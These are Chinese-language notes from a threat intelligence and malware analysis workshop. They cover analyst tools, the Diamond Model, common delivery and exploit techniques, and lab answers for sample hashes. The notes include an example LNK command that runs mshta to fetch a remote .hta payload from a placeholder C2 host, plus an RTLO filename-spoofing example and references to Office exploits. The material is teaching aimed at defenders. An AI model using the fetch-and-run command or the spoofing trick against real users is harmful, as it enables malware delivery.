11/19威脅情資實務分析

威脅情資研究員之旅

求職過程

  • 尋找exploit相關公司
  • 踏入一個陌生環境
  • 參加資安大會有很多工作機會

工作內容

  • 追蹤最新趨勢
  • 獵捕攻擊行動
  • 分析惡意程式
  • 族群追蹤分析
  • 撰寫特徵應用

困難與挑戰

  • 海量資訊無法消化(駭客攻擊速度和防禦速度不成正比)
  • 匿蹤技術不斷提升

成就感

  • 發現新惡意程式
  • 國際研討會發表(尋找新的Vector較容易投稿上演討會)
  • 研究員互動

工作的選擇

  • 當兵->四個月or研替
  • 公司的選擇->甲方or乙方
  • 台灣的資安公司
  • 證照、預聘、實習
    • 乙方較不看證照
    • 甲方看證照

初探威脅情資

  • Knowledge about adversaries

    • Motivations, intentions and methods
    • collected, analyzed and disseminated

      • How to prioritize the threats?
      • Who will consume and benefit from

          • Hacktivist(展現技術)
        • Target
          • Region
          • Industry
    • Collection
      • Data -> Infomation -> Intelligence
      • External Source
        • Community
        • Social Media(Twitter)
        • Threat Data Feed(black list)
        • Open-source Intelligence
        • Deep Web(i.e. tg群賣非法資料)
        • Dark Web(tor)
      • Some Website
        • MITRE ATTACK(ATT&CK)
        • malpedia(整理某攻擊族群的相關的blog)
        • Twitter hashtag #APT
          • Timele9527

        • github awesome-thret-intelligence
        • start.me
    • Dissemination & Integration
    • Analysis & Production
      • Diamond Model
        1. Adversary(追蹤來源)
        2. Capability(攻擊手法)
        3. Infrastructure(攻擊者的設備)
        4. target(被攻擊者)
      • Malware Analysis Workflow
        • 自動化的Analysis都當infomation，還是要人工做校正
      • Threat Intelligence Report
        • Attribution of the adversary

        • Impact of the attack
        • Breakdown of the tactics
        • Indicators and events that can identify the attack
        • Mitigation and Protection

工具介紹

建議先從Observation開始分析->Dynamic->Static

  1. Observation Analysis

  2. Dynamic Analysis

  3. Static Analysis

  4. Observation Analysis

  • Sysinternals Suite

    • Process Explorer(工作管理員plus)
    • TCPViewer(看所有TCP連線)
    • Autoruns(看register檔)

  • Process Monitor

  • System Informer(統整前面的工具)

    • find Handles or DLLs(可以找到哪些process在使用某程式)

  • CaptureBAT(行為紀錄器)

    • 現在官網已經載不到(可以用md5去找載點)

  • WireShark

  • Fiddler

    • HTTPS紀錄器
    • 有些惡意軟體可以繞過他的hook

  • Mitmproxy

    • 真HTTPS/HTTP紀錄器

  • ApateDNS

    • DNS控制器

  1. Static Analysis
  • Detect It Easy(辨識檔案)
  • CFF Explorer(改動PE屬性)
  • dnSpy(.NET decompiler)
  • [IDA Pro(逆向神器)]
    • Tips：
      • In IDA View
        • F5(tab): Go to Pseudocode View
          • Opens the decompiler
        • U: Undefine selected assembly
          • Useful if IDA accidentally interpreted data as instructions
        • Space: Text View (or Graph View)
      • In Pseudocode View
        • X: Show xref
          • Useful when finding other parts of the code that references that specific variable
        • Esc: Go back to last page
        • N = Rename item
        • Y = Set type/definition
        • G = Go to address
      • In IDA/Pseudocode/Hex View…
        • Right click -> Synchronize with -> [Other Views]
      • General…
        • Shift + F12 = Strings View
  • Auto RE(自動命名)
  • CAPA(特徵分析辨識神器)

Diamond Model Analysis

  • Adversary Analysis
    * Language
    * Tools
    * Infrastructure
    * Time zone
    • Victim Analysis
      • Email
      • Decoy File
      • Region
      • Industry
      • Targeted Data
  • Capability Analysis
    • Delivery -> Exploit -> Malware
    • Delivery Methods
      • Spearing phishing email(釣魚郵件)
      • Watering hole attack(在大型網站植入惡意連結)
      • Supply chain attack(打下供應商，在自動更新時做攻擊)
    • Exploit Methods
      • Fake document
        • Word, PDF, Excel… icon
        • Execution file (.exe, .bat, .src)
        • 優點：
          • Only need to change icon of PE.
        • 缺點：
          • The filename extension will be discovered, if user turns on the setting.
        • RTLO naming : UNICODE <202e>
        • ex: 各国の化学大手の5G材料分野における構築‮xcod.scr
        • 上面那個字串取成檔名會變成xcod.scr(惡意軟體副檔名.scr)
      • Macro
        • VBA scripts in Office documents
        • 優點 :
          • Stable and high compatibility.
        • 缺點 :
          • In default, the victim should enable macro manually.
          • http://www.decalage.info/python/oletools
          • olevba
      • LNK file
        • Word, PDF, Excel, etc ICON
        • Can launch program with arguments cmd, powershell, mshta
        • ex:”mshta.exe http://c2.com/payload.hta“
        • 優點：
          • Nice decoy icon. And it’s easy to leverage system tools.
        • 缺點：
          • There is an arrow in the bottom right of icon.
        • LnKParse
      • OLE Exploit
        • RTF file (.rtf)
        • EQNEDT32.EXE
        • CVE-2017-11882, CVE-2018-0802, CVE-2018-0798
        • 優點 :
          • Stable and automatic execution
        • 缺點 :
          • Old 1 day, can’t execute on patched version
        • https://github.com/houjingyi233/office-exploit-case-study/tree/master/CVE-2017-11882%26CVE-2018-0802%26CVE-2018-0798
      • CVE-2018-20250
        • Win RAR exploit
        • 優點：
          • Writing files into relative path
        • 缺點：
          • This kind of vulnerability is rare. The decoy content can be various.
          • The victim didn’t use “decompress here” in specified location.
          • The malware will not execute immediately.
          • 1 day, can’t execute on patched version.
    • Malware Analysis
      • 惡意程式常見樣態 – Process Injection
        • Process Injection手法
          1. 執行 Malware
          2. 於目標上開起一塊可執行的記憶體
          3. 注入惡意程式
          4. 關閉Malware本身

Lab

md5: aa5d19cb085c0594803a17d0a374cfc2
target: icon
Sol：把副檔名改成.exe就能看到是PDF檔。

md5: 1069b462d9a0857fb58d8de2b748497a
target: dropped file
Sol：用Process Monitor去看會發現這隻程式會在star/menu寫入一個叫做Key.exe的檔案。

md5: 0d4444be21870043f776eb9764a79749
target: macro code
Sol：先用olevba解開原本的VB script，會發現裡面會開一個cmd去下載檔案然後執行。

md5: b107c2295eeb63e7a16f03b15da273e4
target: editor32.exe, dropped file
Sol：用Process Monitor看會發現有一個EQNEDT32.EXE寫入東西，正常EQNEDT32不會寫入東西。
